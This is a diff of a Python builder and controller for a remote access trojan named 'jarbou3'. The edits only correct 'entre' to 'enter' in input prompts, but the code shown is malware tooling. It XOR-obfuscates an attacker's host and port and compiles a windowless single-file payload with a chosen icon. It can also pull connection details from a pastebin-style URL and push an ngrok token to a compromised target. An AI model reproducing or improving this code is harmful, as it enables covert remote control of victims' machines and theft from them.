@@ -14,12 +14,12 @@ else:
 
 f = open('serverport.txt', 'r').read()
 if f == "{}" or "":
-    serverport = input('entre serverport:')
+    serverport = input('enter serverport:')
     with open('serverport.txt', 'w') as port:
         port.write(serverport)
 keys = open('key.txt', 'r').read()
 if keys == "{}" or "":
-    key = input('entre serverkey:')
+    key = input('enter serverkey:')
     with open('key.txt', 'w') as keyser:
         keyser.write(key)
 
@@ -93,16 +93,16 @@ def build():
     c = int(input('choose:'))
     if c == 1:
 
-        lhost = input('entre your host:')
+        lhost = input('enter your host:')
         keyhost = genkey(len(lhost))
         cryptedhost = xor_strings(lhost.encode('utf8'), keyhost)
 
-        lport = input('entre lport:')
+        lport = input('enter lport:')
         keyport = genkey(len(lport))
         cryptedport = xor_strings(lport.encode('utf8'), keyport)
         icon = ""
         while isfile(icon) == False:
-            icon = input('entre your icon path:')
+            icon = input('enter your icon path:')
         if platform.system() == "Windows":
             os.system('powershell -c cd stub; cp jarbou3.py ..')
         else:
@@ -129,7 +129,7 @@ def build():
             os.system("cd dist && mv jarbou3.exe ..")
             os.remove("jarbou3.py")
     elif c == 2:
-        URL = input('entre you url:')
+        URL = input('enter you url:')
         u = requests.get(URL).text
         sp = u.split(':')
         print('host is:' + sp[0] + '\n port is:' + sp[1])
@@ -143,7 +143,7 @@ def build():
             replace_string('jarbou3-pastebin.py', '$key', key)
             icon = ''
             while isfile(icon) == False:
-                icon = input('entre your icon path:')
+                icon = input('enter your icon path:')
             print('[+]Compiling')
             if platform.system() == "Windows":
                 os.system('pyinstaller --noconfirm --onefile --windowed --icon "' + icon + '"  "jarbou3-pastebin.py"')
@@ -355,7 +355,7 @@ def target_communication(target, ip):
                     except:
                         print("[-] Error Uploading Ngrok")
                     else:
-                        token = input("entre your ngrok token:")
+                        token = input("enter your ngrok token:")
                         target.send(token.encode('utf-8'))
                         print(target.recv(1024).decode())
                         continue
